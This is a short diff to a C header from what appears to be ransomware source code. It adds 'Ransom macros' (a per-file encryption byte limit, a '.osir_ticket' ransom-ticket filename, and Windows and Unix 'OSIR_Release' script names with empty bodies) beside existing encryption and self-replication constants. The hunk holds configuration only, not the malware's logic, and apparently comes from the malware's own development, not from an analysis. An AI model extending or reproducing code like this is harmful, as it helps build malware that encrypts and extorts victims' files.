@@ -21,7 +21,20 @@
 	//Cryptographical macros
 	#define SYMMETRIC_KEY_SIZE 128/8	//bytes
 	#define SYMMETRIC_IV_SIZE 64/8		//bytes
-
+	#define ASYMMETRIC_KEY_ID 1
+	
+	//Ransom macros
+	#define MAX_BYTES_TO_ENCRYPT 16*1024
+	#define TICKET_FILENAME ".osir_ticket"
+	#ifdef _WIN32
+		#define RELEASE_FILENAME "OSIR_Release.vbs"
+		#define RELEASE_SCRIPT ""
+	#else
+		#define RELEASE_FILENAME "OSIR_Release.sh"
+		#define RELEASE_SCRIPT ""
+	#endif
+	
+	
 	//Replication macros
 	#define XOR_KEY_SIZE 8 // Do not change w/o changing weakcrypt.php
 	#define END_MARKER "xj9"
